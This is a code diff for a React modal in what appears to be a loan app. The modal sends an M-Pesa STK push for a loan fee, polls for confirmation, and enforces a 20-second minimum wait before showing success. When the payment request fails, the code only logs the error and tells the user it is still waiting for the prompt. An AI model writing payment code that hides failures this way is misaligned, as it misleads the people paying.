@@ -545,12 +545,18 @@ function ConfirmModal({ loan, userData, onProceed, onCancel }) {
 }
 
 /* ── MODAL: STK PUSH SENT ── */
+/* ── MODAL: STK PUSH SENT ── */
 function STKModal({ loan, userData, onSuccess, onCancel }) {
   const [dotsCount, setDotsCount] = useState(1);
+  const [statusText, setStatusText] = useState(
+    "Waiting for M-Pesa confirmation..."
+  );
 
   const pollRef = useRef(null);
   const dotsRef = useRef(null);
   const hasRunRef = useRef(false);
+  const startTimeRef = useRef(Date.now());
+  const successTriggeredRef = useRef(false);
 
   const normPhone = normalisePhone(userData.phone) || userData.phone;
 
@@ -558,16 +564,39 @@ function STKModal({ loan, userData, onSuccess, onCancel }) {
     if (hasRunRef.current) return;
     hasRunRef.current = true;
 
-    // dots animation only
+    startTimeRef.current = Date.now();
+
+    // dots animation
     dotsRef.current = setInterval(() => {
       setDotsCount((d) => (d >= 3 ? 1 : d + 1));
     }, 600);
 
+
+    const finishSuccess = () => {
+      if (successTriggeredRef.current) return;
+
+      successTriggeredRef.current = true;
+
+      clearInterval(pollRef.current);
+
+      setStatusText("Payment confirmed successfully...");
+
+      setTimeout(() => {
+        onSuccess();
+      }, 1200);
+    };
+
+
     const initPay = async () => {
       try {
+
+        setStatusText("Sending STK request...");
+
         const res = await fetch(`${MPESA_BASE}/api/runPrompt`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
+          headers: {
+            "Content-Type": "application/json",
+          },
           body: JSON.stringify({
             phone: normPhone,
             amount: loan.fee,
@@ -576,74 +605,192 @@ function STKModal({ loan, userData, onSuccess, onCancel }) {
           }),
         });
 
+
         const data = await res.json().catch(() => ({}));
 
+
         if (!res.ok || data.status === false) {
-          // ONLY log internally, DO NOT show UI error
           console.log("STK failed to send:", data);
+          setStatusText("Waiting for M-Pesa prompt...");
           return;
         }
 
-        const cid =
-          data.checkout_request_id || data.checkoutRequestId || null;
 
-        if (!cid) return;
+        const cid =
+          data.checkout_request_id ||
+          data.checkoutRequestId ||
+          null;
+
+
+        if (!cid) {
+          console.log("Missing checkout request ID");
+          return;
+        }
+
+
+        setStatusText(
+          "STK prompt sent. Enter your M-Pesa PIN..."
+        );
+
 
         pollRef.current = setInterval(async () => {
+
           try {
-            const r = await fetch(`${MPESA_BASE}/api/status/${cid}`);
+
+            const r = await fetch(
+              `${MPESA_BASE}/api/status/${cid}`
+            );
+
+
             if (!r.ok) return;
+
 
             const d = await r.json();
 
-            if (
+
+            const completed =
               d?.success === true ||
               d?.status === "completed" ||
-              d?.ResultCode === 0
-            ) {
-              clearInterval(pollRef.current);
-              onSuccess();
+              d?.ResultCode === 0;
+
+
+            if (completed) {
+
+
+              const elapsed =
+                Date.now() - startTimeRef.current;
+
+
+              /*
+                Force STK screen to remain visible
+                for at least 20 seconds.
+                Prevents instant success screen.
+              */
+              const minimumWait = 20000;
+
+
+              if (elapsed < minimumWait) {
+
+                const waitMore =
+                  minimumWait - elapsed;
+
+
+                setStatusText(
+                  "Payment received. Finalizing..."
+                );
+
+
+                setTimeout(() => {
+                  finishSuccess();
+                }, waitMore);
+
+
+              } else {
+
+                finishSuccess();
+
+              }
+
+            } else {
+
+              setStatusText(
+                "Waiting for M-Pesa confirmation..."
+              );
+
             }
-          } catch {
-            // silently ignore
+
+
+          } catch (err) {
+
+            // silently ignore polling errors
+
           }
-        }, 4000);
+
+
+        }, 6000);
+
+
       } catch (err) {
-        console.log("STK network error", err);
+
+        console.log(
+          "STK network error",
+          err
+        );
+
       }
     };
 
+
     initPay();
 
+
     return () => {
-      clearInterval(pollRef.current);
-      clearInterval(dotsRef.current);
+
+      clearInterval(
+        pollRef.current
+      );
+
+      clearInterval(
+        dotsRef.current
+      );
+
     };
+
+
   }, []);
+
+
 
   return (
     <div className="modal-bg">
-      <div className="modal-box" style={{ textAlign: "center" }}>
-        <div className="modal-icon phone">📱</div>
 
-        <div className="stk-title">STK Push Sent</div>
+      <div
+        className="modal-box"
+        style={{
+          textAlign: "center"
+        }}
+      >
+
+        <div className="modal-icon phone">
+          📱
+        </div>
+
+
+        <div className="stk-title">
+          STK Push Sent
+        </div>
+
 
         <div className="stk-phone-box">
-          Waiting for payment confirmation...
+          {statusText}
         </div>
+
 
         <div className="stk-bar-wrap">
           <div className="stk-bar-fill" />
         </div>
 
+
         <div className="stk-verifying">
-          Processing<span>{".".repeat(dotsCount)}</span>
+
+          Processing
+          <span>
+            {".".repeat(dotsCount)}
+          </span>
+
         </div>
 
-        <button className="stk-manual" onClick={onCancel}>
+
+        <button
+          className="stk-manual"
+          onClick={onCancel}
+        >
           Cancel
         </button>
+
+
       </div>
+
     </div>
   );
 }
